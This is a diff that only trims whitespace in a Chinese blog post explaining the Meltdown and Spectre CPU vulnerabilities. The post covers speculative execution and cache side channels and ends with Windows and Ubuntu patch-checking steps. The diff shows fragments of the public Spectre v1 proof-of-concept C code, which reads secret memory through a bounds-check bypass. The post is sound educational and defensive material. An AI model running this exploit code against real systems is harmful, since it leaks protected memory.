@@ -13,12 +13,12 @@ tags:
 
 #### 0x01 背景
 
-​        meltdown（熔断）以及spectre（幽灵）从爆出到现在大概一个多星期时间了，spectre对应的CVE编号为[CVE-2017-5715](https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-5715.html)、[CVE-2017-5753](https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-5753.html),meltdown对应的CVE编号为[CVE-2017-5754](https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-5754.html)
+​ meltdown（熔断）以及spectre（幽灵）从爆出到现在大概一个多星期时间了，spectre对应的CVE编号为[CVE-2017-5715](https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-5715.html)、[CVE-2017-5753](https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-5753.html),meltdown对应的CVE编号为[CVE-2017-5754](https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-5754.html)
 
 ​	      关于meltdown和spectre相关研究最早是在2016年 Blackhat USA大会上有过相关的描述和猜想，研究人员发现，在现代的处理器架构的用户模式下，存在泄露内存区不可访问区域的敏感信息可能性，但是当时还没有具体的实现方法，之后才被格拉茨技术大学和其他实验室研究人员共同研究出该漏洞猜想的利用方法。
 
 ​        处理器级别漏洞一般可以影响整个云计算基础设施的发展历史，cpu本身的架构同时也面临着严峻的考验。在看了遍大致原理之后，结合之前在公司上cissp课的时候老师讲过的side channel attack侧信道攻击的相关知识，算是把漏洞基本上弄懂了。首先我们先来看下几个需要掌握的概念。
-* 乱序执行 
+* 乱序执行
 
   ​    在cpu的流水线工作中，cpu处理执行指令如果采用顺序的方式，在处理性能上会产生比较大的开销。现代处理器优化了cpu处理指令的方式，程序指令在同样的单位时钟周期内通过乱序执行。所以，可能造成一种提前将需要执行的指令进行预执行的可能。这种方式虽然提高了cpu的指令处理效率，但是可能会成为内核漏洞利用的一种手段。用wiki上的例子解释
 
@@ -41,7 +41,7 @@ tags:
     ​	CPU执行一条指令，一般来说，最少也要经过从内存中取指令，将指令译码解析成微操作（μOP），微操作最终驱动硬件电路部件三个步骤（简称取指令、译码和执行），如果执行一条指令，要等到这三个步骤都完成后，才能执行下一条指令，则一条指令执行时间过长（用CPU硬件术语说就是消耗多个时钟周期），CPU运行速度就无法得到有效提高，循序执行就是必须执行完当前指令才能执行下一条指令的执行方式。
     ​	为了解决这种问题，现代cpu使用分支预测的方式提前预测cpu将要执行的指令。我们用通俗点的一句话概括这种机制：**如果某一段时间内某一条件跳转都走向某一固定分支，则可以预测这条条件跳转指令下一次很大可能也走向这一分支**。
 
-* 隐藏信道攻击（side channel attack） 
+* 隐藏信道攻击（side channel attack）
 
   ​        为了提高内存IO效率，通常将经常使用的数据存放在cache中，cpu缓存通过在较小和较快的内存中缓存常用的数据来减少慢速内存访问延时带来的成本。现代cpu具有多级缓存机制，这些缓存通常可以提供给cpu内存使用，也可以提供给其他缓存共享使用，PLT表也可能存放在缓存中。
 
@@ -62,29 +62,29 @@ if(x < array1_size)
 
 说完漏洞利用过程我们再来通读一下完整的poc代码。代码所有解释均在注释中有相关标注。
 ```c
-#include <stdio.h> 
+#include <stdio.h>
 
-#include <stdlib.h> 
+#include <stdlib.h>
 
-#include <stdint.h> 
+#include <stdint.h>
 
-#ifdef _MSC_VER     /*根据处理器架构（x86或者x64）来使用对应的宏包含的库 */ 
+#ifdef _MSC_VER     /*根据处理器架构（x86或者x64）来使用对应的宏包含的库 */
 
-#include <intrin.h> /* flush缓存库，主要用来调用_mm_clflush（刷新缓存）和__rdtscp函数 */ 
+#include <intrin.h> /* flush缓存库，主要用来调用_mm_clflush（刷新缓存）和__rdtscp函数 */
 
-#pragma optimize("gt",on) 
+#pragma optimize("gt",on)
 
-#else 
+#else
 
-#include <x86intrin.h> /* for rdtscp and clflush */ 
+#include <x86intrin.h> /* for rdtscp and clflush */
 
-#endif 
+#endif
 
 
 /********************************************************************
 
  Victim code.
- 
+
 ********************************************************************/
 
  unsigned int array1_size = 16;
@@ -97,8 +97,8 @@ if(x < array1_size)
 
  uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-/* 根据前文分析的危险函数，此处x虽然设置了array1的上界检查，但是仍然可以通过cpu的乱序执行和分支预测执行内 
-存不可访问区的越界访问，temp表示读取array2的byte值到缓存中 */ 
+/* 根据前文分析的危险函数，此处x虽然设置了array1的上界检查，但是仍然可以通过cpu的乱序执行和分支预测执行内
+存不可访问区的越界访问，temp表示读取array2的byte值到缓存中 */
  void victim_function(size_t x) {
  	if (x < array1_size) {
  		temp &= array2[array1[x] * 512];
@@ -181,7 +181,7 @@ if(x < array1_size)
  }
 
 int main(int argc, const char **argv) {
-        size_t malicious_x=(size_t)(secret-(char*)array1); /* default for malicious_x */ 
+        size_t malicious_x=(size_t)(secret-(char*)array1); /* default for malicious_x */
 		/* 注意，malicious_x实际上是指内存中的secret指针对应字符串地址相对于array1 byte数组的偏移值。*/
         int i, score[2], len=40; /* len对应于secret字符串长度，表示需要猜解泄露信息的长度， score数组存放猜解字符的可信度。*/
         uint8_t value[2]; /* value数组存放最终的猜测结果 */
@@ -199,7 +199,7 @@ int main(int argc, const char **argv) {
                 readMemoryByte(malicious_x++, value, score);
                 printf("%s: ", (score[0] >= 2*score[1]?"Success":"Unclear"));
                 /* 打印value[0]中整型值对应的ascii可显示的字符（ascii可见范围为31～127）*/
-                printf("0x%02X=’%c’ score=%d  ", value[0],(value[0] > 31 && value[0] < 127?value[0]:'?'),score[0]); 
+                printf("0x%02X=’%c’ score=%d  ", value[0],(value[0] > 31 && value[0] < 127?value[0]:'?'),score[0]);
                 if (score[1] > 0)
          			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
                 printf("\n");
@@ -219,7 +219,7 @@ int main(int argc, const char **argv) {
 
   根据微软官方发布的补丁，需要用户使用windows自带的Powershell验证自己client是否存在speculative excution 分为以下几步：
 
-  1. 首先需要下载微软官方的powershell验证module包  [https://aka.ms/SpeculationControlPS](https://aka.ms/SpeculationControlPS) 
+  1. 首先需要下载微软官方的powershell验证module包  [https://aka.ms/SpeculationControlPS](https://aka.ms/SpeculationControlPS)
 
   2. 使用管理员权限打开powershell，解压下载的文件定位到文件目录，执行如下图所示命令验证是否存在风险
 
@@ -263,7 +263,7 @@ int main(int argc, const char **argv) {
 
      具体可以参考下面两篇进行升级
 
-     [https://usn.ubuntu.com/usn/usn-3524-1/](https://usn.ubuntu.com/usn/usn-3524-1/) 
+     [https://usn.ubuntu.com/usn/usn-3524-1/](https://usn.ubuntu.com/usn/usn-3524-1/)
 
      [https://wiki.ubuntu.com/Security/Upgrades](https://wiki.ubuntu.com/Security/Upgrades)
      ​
